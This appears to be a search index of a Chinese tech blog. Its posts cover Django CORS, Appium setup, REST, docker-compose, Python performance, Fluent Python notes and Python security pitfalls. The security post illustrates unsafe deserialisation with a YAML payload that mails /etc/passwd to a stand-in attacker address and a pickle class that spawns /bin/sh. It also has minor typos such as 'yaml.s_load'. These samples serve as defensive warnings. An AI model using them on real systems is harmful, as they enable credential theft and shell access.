<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Django 解决跨域问题]]></title>
    <url>%2F2019%2F08%2F15%2Fdjango-cors-setting%2F</url>
    <content type="text"><![CDATA[1. 使用django-cors-headers解决1.1 安装django-cors-headers$ pip install django-cors-headers 1.2 修改settings.py123456789101112131415INSTALLED_APPS = [ ...... 'corsheaders', ......]MIDDLEWARE = [ ...... 'corsheaders.middleware.CorsMiddleware', 'django.middleware.common.CommonMiddleware', ......]CORS_ORIGIN_ALLOW_ALL = TrueCORS_ALLOW_CREDENTIALS = True 2. 使用自定义middleware123456class EnableCors(MiddlewareMixin): @staticmethod def process_response(request, response): response["Access-Control-Allow-Origin"] = "*" # print(response["Access-Control-Allow-Origin"]) return response 3. 我遇到的问题以前都是直接用1就解决了，没想到今天吃瘪了，懵逼了好一会。。上面两种方式都试过了，前端始终报错，于是用httpie测试了一下接口结果如下 12345678-&gt; % http -h GET http://xxxx/HTTP/1.1 302 Moved TemporarilyConnection: keep-aliveContent-Length: 169Content-Type: text/htmlDate: Thu, 15 Aug 2019 08:34:48 GMTLocation: https://xxxx/Server: stgw/1.3.10.9_1.13.5 破案了，因为公司运维给配的域名自动会把http请求重定向到https，导致返回头没有Access-Control-Allow-Origin字段，也使得跨域的设置失效。]]></content>
      <categories>
        <category>疑难问题</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 10 Appium-Python-Android 环境配置]]></title>
    <url>%2F2019%2F07%2F18%2Fwindows_config_appium%2F</url>
    <content type="text"><![CDATA[本文记录了在 Windows 10系统下 Appium-Python-Android 环境配置过程 1. 环境配置需要的环境如下： jdk8 Android-sdk Python Nodejs Appium Python lib: Appium-Python-Client Python IDE: PyCharm Git Cmake opencv4nodejs mjpeg-consumer ffmpeg bundletool.jar 1.1 JDK81.1.1 到oracle 官网下载JDK8官网下载选择对应版本安装即可 1.1.2 环境变量配置 进入 此电脑-配置-高级系统配置-环境变量 配置全局环境变量(下面的部分) 配置JAVA_HOME 变量，将路径设为C:\xxx\xxx\xx\jdk1.8_xxxx(jdk 安装路径) Path中增加两个条目%JAVA_HOME%\bin和%JAVA_HOME%\jre\bin 在命令行输入java/javac来判断是否配置成功 1.2 Android SDK安装Android Studio即可，下载地址 1.3 Python到Python官网 下载指定版本安装即可(2.7不要用3+) 1.4 NodeJS到nodejs官网最好下载10，LTS版本，12对于后面要安装的模块无法兼容 注意 : 用户的环境变量会自动添加npm，需要手动在系统环境变量里面添加npm 1.5 Appium 安装执行以下命令即可 12npm install -g appiumnpm install -g appium-doctor appium-doctor 用于检测环境是否符合Appium的要求 1.6 Python lib: Appium-Python-Client12pip install Appium-Python-Clientpip install selenium==3.0.2 1.7 PyCharm 安装Jetbrains 官网安装, Community版本即可，有教育邮箱可以申请Pro 1.8 Git 安装官网下载即可, 勾选加入Path 1.9 cmake 安装官网下载, 安装勾选加入Path 1.10 opencv4nodejs 安装1npm install -g opencv4nodejs --registry=https://registry.npm.taobao.org 1.11 ffmpeg安装官网下载build, 然后把bin目录添加到Path 1.12 mjpeg-consumer 安装1npm install -g mjpeg-consumer --registry=https://registry.npm.taobao.org 1.13 bundletool.jar 安装release链接 2. 手机连接usb调试2.1 adb连接将手机连上PC，CMD中输入: 12adb devicesadb shell 如果出现以下信息: error: device unauthorized.This adb server’s $ADB_VENDOR_KEYS is not setTry ‘adb kill-server’ if that seems wrong.Otherwise check for a confirmation dialog on your device. 在手机上进行如下操作: 在开发者工具-允许USB调试 选项关了再开 弹出的对话框选择允许 2.2 查看设备信息1cat /system/build.prop 如果出现以下结果说明需要root权限 cat: /system/build.prop: Permission denied]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Appium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful风格简介]]></title>
    <url>%2F2019%2F06%2F25%2Frest_pieces%2F</url>
    <content type="text"><![CDATA[本文主要介绍了REST的定义和特性 什么是RESTREST, REpresentational State Transfer, 表现层状态转移是一种编程风格。它描述了两个系统(典型的是客户端与服务端)通过网络交互的一系列准则。REST 是一种风格，是指导方针，而不是规定的细则或者标准。所以只是有“最佳实践”, 而没有“规范说明”。最早由Roy Fielding于2000年在他的博士论文”Architectural Styles and the Design of Network-based Software Architectures”中提出。REST是基于资源的，下面是REST风格的一部分： Things vs actionsNouns vs verbsResources identified by URIs . Multiple URIs may refer to the same resourceResources are separate from their representation representational 表现层表现层是指资源的表现形式，也就是资源的信息是如何组织的。他能部分代表资源的状态，表现层在客户端与服务端之间交互，典型的形式是XML/JSON举个例子，数据库中存有一个人的个人信息，那么: 资源: 这个人的个人信息 服务: 获取联系方式 (GET) 表现层: 人名，住址，电话(JSON/XML) 为什么使用RESTful API 设计简洁 遵循标准的HTTP协议 独立于编程语言之外 最重要的是: 服务端与客户端的轻耦合，它让服务端对客户端”不可知”，只要能使用HTTP协议进行交互，不论是浏览器，手机还是其他设备都无所谓。 RESTful 6个指导性的约束 Uniform Interface 统一的接口 Stateless 无状态 Cacheable 可缓存 server-client 服务端-客户端 分层的系统 按需代码 Uniform Interface 统一的接口资源的定位: 独立的资源会被HTTP请求定位, 比方说使用 URI. 在概念上，资源是与表现层分离的，客户端请求的得到的数据是资源的表现层而不是资源本身。 通过表现层操作资源: 当客户端拥有了(附加了一些元信息，如HTTP HEADERs的)资源的表现层, 它就有了足够的权限对资源进行修改或者删除。 自描述信息: 每个HTTP消息包含足够的信息，告诉接收端怎样处理这个信息。 HATEOAS(Hypermedia as the Engine of Application State, 超媒体即应用状态引擎): 当客户端游泳一个初始3的URI，REST应用应该可以动态利用服务端提供的链接来访问到所有资源或者进行所有操作。 Stateless 无状态无状态原则Statelessness：无状态原则是RESTful架构设计中一个非常重要的原则，无状态是相对于有状态而言的。在理解什么是无状态的交互请求之前，首先我们需要了解什么是有状态，并对两者进行比较以加深认识。 Web服务的状态Web服务建立在Web应用程序的协议之上，如：HTTP协议。Web服务的状态指的是请求的状态，而不是资源的状态。是两个关联用户(Client与Server)进行交互操作时所留下来的公共信息(工作流、用户状态信息等数据)。这些信息可以被指定在不同的作用域中，如：page、request、session、application或全局作用域，一般由Server中的Session来保存这些信息。 有状态的Web服务在基于状态的Web服务中，Client与Server交互的信息(如：用户登录状态)会保存在Server的Session中。再这样的前提下，Client中的用户请求只能被保存有此用户相关状态信息的服务器所接受和理解，这也就意味着在基于状态的Web系统中的Server无法对用户请求进行负载均衡等自由的调度(一个Client请求只能由一个指定的Server处理)。同时这也会导致另外一个容错性的问题，如果指定的Server在Client的用户发出请求的过程中宕机，那么此用户最近的所有交互操作将无法被转移至别的Server上，即此请求将无效化。 无状态的Web服务在无状态的Web服务中，每一个Web请求都必须是独立的，请求之间是完全分离的。Server没有保存Client的状态信息，所以Client发送的请求必须包含有能够让服务器理解请求的全部信息，包括自己的状态信息。使得一个Client的Web请求能够被任何可用的Server应答，从而将Web系统扩展到大量的Client中。 两者的区别因为无状态原则的特性，让RESTful在分布式系统中得到了广泛的应用，它改善了分布式系统的可见性、可靠性以及可伸缩性，同时有效的降低了Client与Server之间的交互延迟。无状态的请求有利于实现负载均衡，在分布式web系统下，有多个可的Server，每个Server都可以处理Client发送的请求。有状态的请求的状态信息只保存在第一次接收请求的Server上，所以后来同一个Client的请求都只能由这台Server来处理，Server无法自由调度请求。无状态请求则完全没有这个限制。其次，无状态请求有较强的容错性和可伸缩性。如果一台服务器宕机，无状态请求可以透明地交由另一台可用Server来处理，而有状态的请求则会因为存储请求状态信息的Server宕机而承担状态丢失的风险。Restful风格的无状态约束要求Server不保存请求状态，如果确实需要维持用户状态，也应由Client负责。例如： 使用Cookies通过客户端保持登陆状态： 在REST中，每一个对象都是通过URL来表示，对象用户负责将状态信息打包进每一条信息内，保证对象的处理总是无状态的。在HTTP服务器中，服务器没有保存客户端的状态信息，客户端必须每次都带上自己的状态去请求服务器。客户端以URL形式提交的请求包含了cookies等带状态的数据，这些数据完全指定了所需的登录信息，而不需要其他请求的上下文或内存。 传递User credentials是无状态的，而传递SessionID是有状态的,因为session信息保存在服务器端。 无状态请求：Server不保存任何请求状态信息，Client的每一个请求都具有User credentials等所需要的全部信息，所以能被任意可用的Server应答。 有状态请求：Server保存了Client的请求状态，Server会通过Client传递的SessionID在Server中的Session作用域找到之前交互的信息，并以此来实现应答。所以Client只能由某一个Server来应答。 Cacheable 可缓存互联网中的客户端和中间层服务器可以缓存响应。因此响应必须直接或间接定义自身是否可被缓存，以免客户端使用过期的响应数据来发送其它请求。良好的缓存策略可以有效减少客户端-服务器之间的交互，从而进一步提高系统的可伸缩性和性能。 Server-Client 服务端-客户端 wiki: 客户端-服务端模型 客户端-服务端分离:通过分离用户界面和数据存储这两个关注点，提高了用户界面跨平台的可能性，通过简化服务器组件提高了其可伸缩性。这种分离对于Web来说更加重要的意义是，它使得组件能够进行独立修改和扩展，从而能够支持大量组织的网络化需求。 Layered system 分层系统 客户端通常无法判断它是否是直接连接到后端服务器，还是中间服务器。中间服务器可通过启用负载平衡，并通过提供共享高速缓存来提高系统的可扩展性。当然也可以强制执行安全政策。 Code on demand 按需代码（可选） 服务端可以通过传递可执行代码临时为客户端扩展或自定义功能。这方面的例子包括可编译的组件如Java applets和客户机端脚本如JavaScript。]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运行多容器的应用--使用docker-compose]]></title>
    <url>%2F2019%2F06%2F03%2Fdocker-compose-ups-ans-downs%2F</url>
    <content type="text"><![CDATA[使用docker-compose.yml对多容器的应用(组)进行容器编排 使用docker-compose.yml来定义你的应用，并且使用up/down命令来运行，这样可以让你对多容器的应用进行编排。Compose是一个定义和运行多容器应用的工具, 也就是容器编排工具。使用Compose时，你会使用到一个Compose配置文件去配置你的应用的各个服务。然后通过使用这个配置文件就可以一条命令启动所有的服务。 和docker命令的类似之处Docker-compose命令大体上和docker命令类似，除了一些给多容器应用的使用的附加指令。尤其是下面这些命令，和docker命令很类似: docker-compose up / downdocker-compose up 用于创建并运行容器. 在detached( -d )模式下, 启动容器之后Compose会退出, 但是容器还在后台运行。 1docker-compose up -d rabbit-mq docker-compose down 用于停止并移除容器，网络，镜像和卷。 1docker-compose down -v 这个命令有一些有用的选项: –rmi [type] 移除镜像。type必须是以下其中一个: ‘all’: 移除任何服务使用的所有的镜像。 ‘local’: 只移除没有通过image设置自定义标签的镜像。 -v, –volumes 移除在配置文件中通过volumes声明的命名卷和attach到这个容器的所有卷。 –remove-orphans 移除没有在Composer中定义的容器(杀死孤儿)。 创建一个Dockerfile就像运行一个docker需要镜像一样，创建镜像也需要一个dockerfile来确定怎样创建镜像和容器。一个Ruby on Rails应用使用的Dockerfile可能是这样:1234567FROM ruby:2.3.3 RUN apt-get update -qq &amp;&amp; apt-get install -y build-essential libpq-dev nodejs RUN mkdir /myapp WORKDIR /myapp COPY Gemfile /myapp/Gemfile COPY Gemfile.lock /myapp/Gemfile.lock RUN bundle install COPY . /myapp docker-compose: getting started guide 有一步一步的指导教你创建dockerfile然后把dockerfile改写成docker-compose.yml。 docker-compose.yml之旅: 结构和组成要定义你自己的多容器应用，你需要在你的应用的root文件夹使用docker-compose.yml。compose-file的文档提供了详尽的解释和指导去生成这个文件。 下面是主要特性的快速上手指南:文件的最开始引入版本: "3"``` 12345然后定义服务: ```services:``` 之后列出你想要创建的服务, 每一个容器都有对应的配置项。 - image - 指定一个dockerhub上或者本地有的镜像 ```image: ruby:alpine depends_on — 这个容器依赖的其他容器，启动父容器也会同时启动父容器依赖的容器。 1234567891011version: &apos;3&apos; services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres environment — 增加环境变量. 12345678environment: RACK_ENV: development SHOW: &apos;true&apos; SESSION_SECRET: environment: - RACK_ENV=development - SHOW=true - SESSION_SECRET volumes — 包含宿主机的路径或者命名卷。 你可以通过这样的格式替换容器的数据 to file>:``` 并且可以把文件夹权限接在后面``` :ro``` (read only)12345678910111213141516171819```dockerfileversion: &quot;3.2&quot; services: web: image: nginx:alpine volumes: - type: volume source: mydata target: /data volume: nocopy: true - type: bind source: ./static target: /opt/app/static db: image: postgres:latest volumes: - &quot;/var/run/postgres/postgres.sock:/var/run/postgres/postgres.sock&quot; - &quot;dbdata:/var/lib/postgresql/data&quot; ports — 可以指定映射两个对应的端口(HOST:CONTAINER), 或者只指定容器的端口，系统会自动分配一个临时的外部端口。 123456789ports: - "3000" - "3000-3005" - "8000:8000" - "9090-9091:8080-8081" - "49100:22" - "127.0.0.1:8001:8001" - "127.0.0.1:5000-5010:5000-5010" - "6060:6060/udp" Docker Compose 功能非常强大，还有更多用法需要学习，Docker文档有非常详尽的说明，本文只是略作抛砖引玉。]]></content>
      <categories>
        <category>随手摘录</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么Python 如此之慢]]></title>
    <url>%2F2019%2F05%2F30%2Fwhy-python-so-slow%2F</url>
    <content type="text"><![CDATA[Python 正在爆炸般流行起来，它被用于DevOps, 数据处理，web开发和安全领域。但是在速度方面却没有取得过什么胜利。 为什么Python这么慢呢？ 为什么Python 如此之慢原文链接: https://hackernoon.com/why-is-python-so-slow-e5074b6fe55b Python 正在爆炸般流行起来，它被用于DevOps, 数据处理，web开发和安全领域。但是在速度方面却没有取得过什么胜利。Java在速度方面和C/C++/C#/Python比起来如何？答案很大程度上取决于你所运行的应用。没有什么跑分是完美的，但是编程语言测评游戏(Computer Language Benchmarks Game)是一个很好的切入点。 十多年来编程语言测评游戏一直对我来说是一个参考，相比于其他语言，比如Java, C#, Go, JavaScript, C++, Python是最慢的语言之一。这些语言中包含了JIT编译器(c#, java)，AOT编译器(c/c++)和解释型语言js。 注意: 当我说“Python”, 我说的是Python的参考实现CPython, 其他实现这篇文章也会提到。这篇文章想要回答的一个问题就是：当Python执行一个相同的程序要比别的语言实现慢2-10倍的时候，为什么会这么慢，难道我们不能让它跑的更快吗？ 下面说一下本文的主要观点(当然也是客观事实):“因为Python 有GIL(Global Interpreter Lock, 全局解释锁)”“因为Python 是解释型语言而不是编译型”“因为Python 是动态类型语言”哪一个原因影响最大对速度影响最大呢？ GIL现代计算机的cpu有多核，有时候有多个处理器。为了充分利用多出来的处理能力，操作系统定义了一种更加低级别的单位:线程，让一个进程可以启动多个线程来执行系统指令。这样的话如果一个进程的CPU资源非常紧张，负载就会均匀的平摊到各个CPU核心，这种方法能够很高效地让大多数任务更快完成。当我写这篇文章的时候，我的Chrome浏览器开启了44个线程。要记住的是线程的结构和api在POSIX-based的系统(OSX, Linux)和Windows下面是不一样的。操作系统同样会管理线程的调度。如果你没有进行过多线程编程，你需要快速熟悉一下”锁”的概念。不像单线程的进程，多线程的进程中，当你更改内存中的变量，你需要确认多个线程不会同时尝试访问或修改同一个内存块。 当CPython创建变量，它会给变量分配内存空间并且计算变量的引用数，如果引用数为0, Python将会释放掉这块内存，这就是为什么for循环表达式里的临时变量不会让内存爆炸。也是CPython的垃圾回收机制。 接下来的挑战是，当变量被多个线程共享时，如何锁住引用数。Python程序执行过程中有一个全局解释锁GIL 小心地控制着线程的执行。Python解释器在同一时间只能执行一个操作，不论有多少个线程。 这对于Python应用的性能表现意味着什么呢？如果你的应用是单线程单解释器的，这对你的应用性能毫无影响。移除GIL也不会对你的应用性能有任何影响。如果你想在同一个解释器中使用线程进行并发操作，并且你的线程是IO密集型的，那你就会看到GIL的资源争夺。 David Beazley的博客中对多线程程序中 GIL 的作用进行了可视化:http://dabeaz.blogspot.com/2010/01/python-gil-visualized.html 下图表示了Python多线程程序中GIL的分配情况。 如果一个Python程序里有多个线程，一个程序运行的时候会拿着GIL，当遇到I/O的时候会放开GIL，但是CPU-bound的线程通常不会进行I/O。Python切换线程的一种作法是每100 ticks检查一下，可以通过sys.setcheckinterval()修改这个数值。综上所述，因为Python线程不能有效利用多核，但是增加了CPU context switch的消耗，所以对于CPU-bound的程序表现很差。更糟糕的是，在多核情况下可能表现会更差，因为系统支持多线程运行但是GIL保证只有一个线程运行，这时候多线程会反复的检查GIL是否被释放，但是拿不到GIL(因为有太多线程竞争)，有可能导致系统发生Trashing现象。 如果你使用一个web应用(Django)并且使用WSGI，每个请求会有一个单独的Python解释器，由于Python的全局解释锁启动很慢，所以有的WSGI实现会有一个“守护模式”，就是先把Python进程启动起来放着，等待请求进来使用。 那其他的Python实现呢？PyPy也有GIL但是比CPython快超过三倍。JPython 没有GIL, 因为JPython的线程代表一个Java线程，得益于JVM的内存管理机制，JPython不使用GIL。 JavaScript是怎么做的呢首先所有的Javascript 引擎使用标记-清除的垃圾回收机制。 上面提到过， GIL的需求主要是因为CPython的内存管理算法。JavaScript 没有GIL, 但它同时也是单线程的所以它并不需要GIL。JavaScript使用事件循环和Promise/Callback实现异步的编程而不是使用并发。Python也有类似实现asyncio “因为Python是解释型语言”我经常听说这个言论，我觉得这是一个对于CPython执行方式的粗暴简化。如果你在终端执行一个命令(比如python myscript.py)，CPython会开始顺序执行一大串任务: 读取，词法分析，解析，编译，解释，执行代码。 一个重点是.pyc文件的创建。在编译阶段，字节码串被写到pycache/下(3.x)或者和py文件相同的文件夹(2.x)。这个操作不仅对你自己的代码有效，也包括所有你导入的模块。 所以大多数情况下，Python在本地解释和执行字节码，与之相比 Java 和 C#.NET:Java 编译成一个“中间语言”，然后JVM读字节码实时将其转化为机器码，.NET的CIL也一样，.NET CLR(Common-Language-Runtime, 通用语言运行时)，使用的是实时编译到机器码(JIT)。 所以，如果它们都用到了虚拟机和部分字节码，为什么Python在跑分上比Java/C#慢这么多呢?Java/C# 是即时编译(JIT)的。JIT要求一个中间语言，以便让代码转换成区块。AOT编译是为了可以在交互前保证CPU能理解每一行代码。JIT本身不会让执行速度更快，以为它仍然是在执行相同的字节码， 然而JIT可以让实时优化成为可能，一个好的JIT编译器应用的那一部分被执行很多次，这些部分被称为“热点”。这样编译器会将这些部分替换成更加高效的版本。这意味着如果你的程序重复做相同的事情，使用JIT就能显著提高速度。同时Java/C#是强类型的语言所以优化器可以对语言作出更多预设。 PyPy 使用JIT，前面提到，它比CPython快得多。 所以为什么CPython不用JIT呢JIT有很多缺点，其中一个就是启动慢。CPython 启动已经相对很慢了, PyPy比CPython启动慢CPython2-3倍。JVM启动是出了名的慢。.NET CLR使用随操作系统启动来解决这个问题, 但CLR的开发者同时也是其依赖的系统的开发者(win)。如果你的Python是单进程，运行时间很长，并且有很多重复操作可以被优化，那么使用JIT就很有意义。但是CPython是通用实现，当使用Python开发命令行工具，每次都等待JIT启动是非常糟糕的体验。CPython需要服务于尽可能广泛的场景，有可能使用JIT反而会大幅度拖累系统性能。如果你需要使用JIT并且有一个适合的工作场景，那可以使用PyPy。 “因为Python是动态类型语言”在静态类型语言中，声明变量之前需要声明变量类型，包括 C, C++, Java, C#, Go。动态类型语言中仍然有类型的概念，但是变量的类型可变。 12a = 1a = "foo" 这个小例子中, Python 使用相同的变量名创建了类型不同的第二个变量，释放掉了第一个变量的内存空间。静态类型语言并不是为了麻烦你而设计的，而是根据CPU行为设计的。如果所有的行为最终会变成二进制操作，你必须将对象转换成更加底层的数据结构。 Python为你代劳了转换到底层数据结构这一步，所以你不用关心。当然不用声明变量并不是Python慢的原因。Python语言的设计极为灵活，几乎所有东西都能变成动态的，比如猴子补丁。这种设计让Python的优化变得难以想象的困难。 猴子补丁: 在运行时替换方法、属性等 在不修改第三方代码的情况下增加原来不支持的功能 在运行时为内存中的对象增加patch而不是在磁盘的源代码中增加 python中一个很简单的例子： 1import simplejson as json 所以是Python的动态性让它如此慢吗？比较和转换类型非常耗费资源, 每次对变量读写、引用都需要检查类型。如此动态化的语言是很难优化的，很多Python的不同实现能更快是因为为了性能在灵活性方面做了妥协。 比如CPython, 将C语言的静态类型和Python结合，这些静态类型能提供84倍的性能优化。 结论Python这么慢主要是因为动态的生态和它的多功能性。它能用来解决所有类型的问题，所以在不同领域我们可以选择更加快速的Python版本。有很多方法可以用来优化你的Python程序，比如活用async, 了解分析工具, 考虑使用多个解释器等等。比如一些启动时间不重要的应用，或者能够能JIT获益的程序我们可以使用PyPy。如果你的代码有些部分非常要求性能，又使用了很多C语言的静态类型，那么选择Cython。]]></content>
      <categories>
        <category>随手摘录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>GIL</tag>
        <tag>动态类型语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第十五章 上下文管理器和 else 块]]></title>
    <url>%2F2019%2F04%2F26%2Ffluent-python-15%2F</url>
    <content type="text"><![CDATA[Fluent Python 第十五章读书笔记 Chapter 15. Context Managers and else Blocks第十五章: 上下文管理器和 else 块本章主要会讨论python中的流程控制特性 with语句和上下文管理器 for, while, try 语句的else子句 with 语句会设置一个临时的上下文，交给上下文管理器对象控制，并且负责清理上下文。这么做能避免错误并减少样板代码，因此 API 更安全，而且更易于使用。除了自动关闭文件之外，with 块还有很多用途。else 子句与 with 语句完全没有关系。但是也涉及到流程控制。 15.1 if语句之外的else块else 子句不仅能在 if 语句中使用，还能在 for、while 和 try 语句中使用。 for/else、while/else 和 try/else 的语义关系紧密，不过与 if/else 差别很大。else 子句的行为如下： for仅当 for 循环运行完毕时（即 for 循环没有被 break 语句中止）才运行 else 块。 while仅当 while 循环因为条件为False而退出时（即 while 循环没有被 break 语句中止）才运行 else 块。 try仅当 try 块中没有异常抛出时才运行 else 块。官方文档还指出：“else 子句抛出的异常不会由前面的 except 子句处理。”在所有情况下，如果异常或者 return、break 或 continue 语句导致控制权跳到了复合语句的主块之外，else 子句也会被跳过。 在 Python 中，try/except 不仅用于处理错误，还常用于控制流程。为此，Python 官方词汇表还定义了两个缩略词（口号）。 EAFP 取得原谅比获得许可容易（easier to ask for forgiveness than permission）。这是一种常见的 Python 编程风格，先假定存在有效的键或属性，如果假定不成立，那么捕获异常。这种风格简单明快，特点是代码中有很多 try 和 except 语句。与其他很多语言一样（如 C 语言），这种风格的对立面是 LBYL 风格。接下来，词汇表定义了 LBYL。 LBYL 三思而后行（look before you leap）。这种编程风格在调用函数或查找属性或键之前显式测试前提条件。与 EAFP 风格相反，这种风格的特点是代码中有很多 if 语句。在多线程环境中，LBYL 风格可能会在“检查”和“行事”的空当引入条件竞争。例如，对 if key in mapping: return mapping[key] 这段代码来说，如果在测试之后，但在查找之前，另一个线程从映射中删除了那个键，那么这段代码就会失败。这个问题可以使用锁或者 EAFP 风格解决。如果选择使用 EAFP 风格，那就要更深入地了解 else 子句，并在 try/except 语句中合理使用。 15.2 with块和上下文管理上下文管理器对象存在的目的是管理 with 语句，就像迭代器的存在是为了管理 for 语句 一样。 with 语句的目的是简化 try/finally 模式。这种模式用于保证一段代码运行完毕后执行某项操作，即便那段代码由于异常、return 语句或 sys.exit() 调用而中止，也会执行指定的操作。finally 子句中的代码通常用于释放重要的资源，或者还原临时变更的状态。 上下文管理器协议包含 __enter__ 和 __exit__ 两个方法。with 语句开始运行时，会在 上下文管理器对象上调用 __enter__ 方法。with 语句运行结束后，会在上下文管理器对象上调用 __exit__ 方法，以此扮演 finally 子句的角色。 最常见的例子是确保文件对象被关闭。在退出了with块后，文件对象变成了只能读取属性而不能进行IO操作的对象。 不易察觉但很重要的一点：执行 with 后面的表达 式得到的结果是上下文管理器对象，不过，把值绑定到目标变量上（as 子句）是在上下文管理器对象上调用 __enter__ 方法的结果。不管控制流程以哪种方式退出 with 块，都会在上下文管理器对象上调用 __exit__ 方 法，而不是在 __enter__ 方法返回的对象上调用。 15.3 contextlib 标准库中的上下文管理器contextlib 模块中有一些类和函数使用范围很广。 closing 如果对象提供了 close() 方法，但没有实现 enter/exit 协议，那么可以 使用这个函数构建上下文管理器。 suppress 构建临时忽略指定异常的上下文管理器。 @contextmanager 这个装饰器把简单的生成器函数变成上下文管理器，这样就不用创建类去实现管理器协议了。 ContextDecorator 这是个基类，用于定义基于类的上下文管理器。这种上下文管理器也能用于装饰函数，在受管理的上下文中运行整个函数。 ExitStack 这个上下文管理器能进入多个上下文管理器。with 块结束时，ExitStack 按照后进 先出的顺序调用栈中各个上下文管理器的 exit 方法。如果事先不知道 with 块要进入多少个上下文管理器，可以使用这个类。例如，同时打开任意一个文件列表中的所有文件。 显然，在这些实用工具中，使用最广泛的是 @contextmanager 装饰器，因此要格外留心。这个装饰器也有迷惑人的一面，因为它与迭代无关，却要使用 yield 语句。由此可以引出协程，这是下一章的主题。 在使用 @contextmanager 装饰的生成器中，yield 语句的作用是把函数的定义体分成两 部分：yield 语句前面的所有代码在 with 块开始时（即解释器调用 __enter__ 方法 时）执行， yield 语句后面的代码在 with 块结束时（即调用 __exit__ 方法时）执行。 一个例子： 123456789101112131415161718192021import contextlib@contextlib.contextmanager def looking_glass(): import sys original_write = sys.stdout.write def reverse_write(text): original_write(text[::-1]) sys.stdout.write = reverse_write msg = '' try: yield 'JABBERWOCKY' except ZeroDivisionError: msg = 'Please DO NOT divide by zero!' finally: sys.stdout.write = original_write if msg: print(msg) 使用 @contextmanager 装饰器时，要把 yield 语句放在 try/finally 语句 中（或者放在 with 语句中），这是无法避免的，因为我们永远不知道上下文管理器 的用户会在 with 块中做什么。 在这节的例子中yield 与迭代没有任何关系。在本 节所举的示例中，生成器函数的作用更像是协程：执行到某一点时暂停，让客户代码运 行，直到客户让协程继续做事。 15.4 小结 讨论了 for、while 和 try 语句的 else 子句。 然后，本章讨论了上下文管理器和 with 语句的作用。 最后，我们分析了标准库中 contextlib 模块里的函数。 @contextmanager 装饰器优雅且实用，把三个不同的 Python 特性结合到了一起：函数装 饰器、生成器和 with 语句。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Context Manager</tag>
        <tag>上下文管理器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 的十个安全问题]]></title>
    <url>%2F2019%2F04%2F26%2Fpython-sercurity-10-problems%2F</url>
    <content type="text"><![CDATA[本文介绍了Python中可能出现的十个安全问题。 原文:https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03 1. 输入注入 SQL 注入: 容易发生在Python中写raw sql进行查询的场景。 解决方式:尽量用ORM，如果要写raw sql, 尽量熟悉SQL注入cheatsheet 命令注入: 容易发生在os.popen(), subprocess.Popen()等场合 使用shelex模块保证引号的转义是正确的 2.解析XML大多发生在解析不被信任的xml(non-trusted xml) billion lols 外部实体拓展 不安全的非标准库 解决方式: 使用较为安全的解析库进行解析，入defusedxml 3. 断言语句不要用断言对用户的权限进行判断 123def foo(request, user): assert user.is_admin, “user does not have access” # secure code... 生产环境中会直接跳过assert直接进行用户可能没有权限的操作 解决方式: 断言只用在与其他开发者交互的场景，比如api调用检查和单元测试 4.timing attack攻击者通过对比较指定加密值的时长判断比较器的行为和使用算法。由于这种攻击很依赖时间的准确度，很少有远程的攻击，更多的是对一些命令行工具进行破解。时间攻击的介绍一个例子SSH-based timing attack 解决方式:使用Python 3.5 中引入的secrets.compare_digest 进行敏感字符串的比较 site-packages 污染Python的包引用非常的灵活，这使得猴子补丁和标准库函数的重写非常容易，但也造成了最大的安全漏洞之一。出现场景: 攻击者在Pypi中使用与流行库名称相似的库名 解决方式:眼神要好，不要手抖使用virtualenv 保持全局site-packages的清洁下载包时核对签名 临时文件攻击在你使用mktemp()创建临时文件后和处理临时文件之前修改临时文件。 解决方案:使用tempfile模块和mkstemp()创建临时文件 使用yaml.load在yaml的load过程中会出现安全问题例如在yaml中加入这一句1!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"] 解决方法:yaml.s_load 解析pickel例:123456789import cPickleimport subprocessimport base64class RunBinSh(object): def __reduce__(self): return (subprocess.Popen, (('/bin/sh',),))print base64.b64encode(cPickle.dumps(RunBinSh())) 以上是将打开shell的程序打包到pickel的代码 解决方案:千万不要从未知源解析pickel 使用系统Python, 不打补丁使用系统提供的Python版本可能有很多未修复的漏洞 解决方式:使用新版Python，为系统Python 打补丁 不给Python的依赖打补丁同上]]></content>
      <categories>
        <category>随手摘录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python 第十四章 可迭代对象，迭代器和生成器]]></title>
    <url>%2F2018%2F09%2F20%2Ffluent-python-14%2F</url>
    <content type="text"><![CDATA[Fluent Python 第十四章读书报告 Chapter 14. Iterables, Iterators, and GeneratorsOperator第十四章: 可迭代对象，迭代器和生成器迭代是数据处理的基石。扫面内存中放不下的数据集时， 我们需要找到一种惰性获取数据的方式，即按需每次获取一个数据项。这就是迭代器模式(Iterator Pattern).下面会说明Python语言是如何内置迭代器模式的。 所有生成器都是迭代器，因为生成器完全实现了迭代器接口。不过，根据《设计模式：可复用面向对象软件的基础》一书的定义，迭代器用于从集合中取出元素；而生成器用于“凭空”生成元素。通过斐波纳契数列能很好地说明二者之间的区别：斐波纳契数列中的数有无穷个，在一个集合里放不下。不过要知道，在 Python 社区中，大多数时候都把迭代器和生成器视作同一概念。 Python3 中， 生成器有广泛的用途， 例如range() 在Python2中返回列表， 在3中返回一个类似生成器的对象。 在Python语言内部， 迭代器用于支持: for循环 构建和扩展集合类型 逐行遍历文本文件 列表推导， 字典推导和集合推导 元组拆包 调用函数时使用*拆包实参 本章将讨论： 语言内部使用iter()内置函数处理可迭代对象的方式 如何使用Python实现经典的迭代器模式 说明生成器函数的工作原理 如何使用生成器函数或生成器表达式代替经典的迭代器 如何使用标准库中通用的生成器函数 如何使用yeild from 语句合并生成器 为什么生成器和协程看似相同实则差别很大， 不能混淆 